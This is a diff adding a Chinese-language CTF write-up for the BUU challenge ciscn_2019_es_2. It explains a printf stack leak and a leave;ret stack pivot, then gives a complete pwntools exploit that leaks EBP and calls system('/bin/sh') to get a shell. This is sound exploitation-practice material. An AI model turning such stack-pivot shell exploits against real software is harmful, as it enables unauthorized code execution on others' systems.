@@ -2430,3 +2430,53 @@ if __name__ == "__main__":
 
 接着就是正常的 rop 链了。
 
+#### ciscn_2019_es_2
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_es_2)
+
+这道题给了两个 printf，可以泄露栈。
+
+<img width="2559" height="937" alt="image" src="https://github.com/user-attachments/assets/55c7a5dd-d58b-41e7-8f9a-06804323718c" />
+
+溢出给了 8 个字节，刚好够覆盖 ebp 和 eip。
+
+所以第一次 printf 肯定是泄露栈，然后 gdb 调试一下，找一下泄露的栈到输入的 ebp 的偏移。
+
+<img width="1746" height="851" alt="900f5a51aa2e6d0e8e2ad953bd8cfc25" src="https://github.com/user-attachments/assets/33758e9d-9426-4889-a52d-e5ce6997442f" />
+
+偏移是 0x38。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 29114
+io = remote(host,port)
+# io = process('./ciscn_2019_es_2')
+elf = ELF('./ciscn_2019_es_2')
+system = elf.plt['system']
+leave_ret = 0x8048562
+payload_1 = b'A'*0x24 + b"meow"
+
+def main():
+    io.recvuntil(b"Welcome, my friend. What's your name?\n")
+    io.send(payload_1)
+    io.recvuntil(b"meow")
+    leak_data = io.recvn(4)
+    leak_ebp = u32(leak_data)
+    print("Leaked EBP:", hex(leak_ebp))     # Leaked EBP: 0xffe14708
+    # gdb.attach(io)                        # 0xffe146d0
+    ebp = leak_ebp - 0x38
+    binsh = ebp + 0x10
+    payload_2 = b'A'*4 + p32(system) + p32(0) + p32(binsh) + b"/bin/sh\x00"
+    payload_2 = payload_2.ljust(0x28,b"\x00")
+    payload_2 = payload_2 + p32(ebp) + p32(leave_ret)
+    io.sendline(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
